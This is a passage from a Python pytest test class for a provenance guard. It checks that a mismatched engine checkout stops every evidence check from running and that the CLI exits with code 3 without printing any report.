    def test_matching_engine_and_checkout_runs(self, tmp_path):
        """Same tree on both sides — the guard must stay out of the way."""
        self._engine_checkout(tmp_path)
        with _patched_engine(tmp_path / "core" / "__init__.py"):
            report = run_evidence_checks(
                tmp_path, changed_files=[], checks=["lint"],
            )
        assert report.overall == "insufficient-evidence"

    def test_guard_runs_before_any_check(self, tmp_path, monkeypatch):
        """It fails the WHOLE run, not one check — nothing may execute."""
        self._engine_checkout(tmp_path)
        fake_engine = tmp_path.parent / f"{tmp_path.name}-other" / "core"
        fake_engine.mkdir(parents=True, exist_ok=True)
        (fake_engine / "__init__.py").write_text("", encoding="utf-8")

        def explode(*_args, **_kwargs):
            raise AssertionError("a check ran despite a provenance mismatch")

        monkeypatch.setattr(evidence_checks, "_run", explode)
        with (
            pytest.raises(evidence_checks.ProvenanceError),
            _patched_engine(fake_engine / "__init__.py"),
        ):
            run_evidence_checks(tmp_path, checks=list(ALL_CHECKS))

    def test_cli_exits_3_with_no_report_on_stdout(self, tmp_path, capsys):
        """--json must emit NOTHING interpretable when provenance fails."""
        self._engine_checkout(tmp_path)
        fake_engine = tmp_path.parent / f"{tmp_path.name}-cli" / "core"
        fake_engine.mkdir(parents=True, exist_ok=True)
        (fake_engine / "__init__.py").write_text("", encoding="utf-8")

        with _patched_engine(fake_engine / "__init__.py"):
            code = main([str(tmp_path), "--json"])

        captured = capsys.readouterr()
        assert code == 3
        assert captured.out.strip() == "", "no report may reach stdout"
        assert "[PROVENANCE-FAIL]" in captured.err
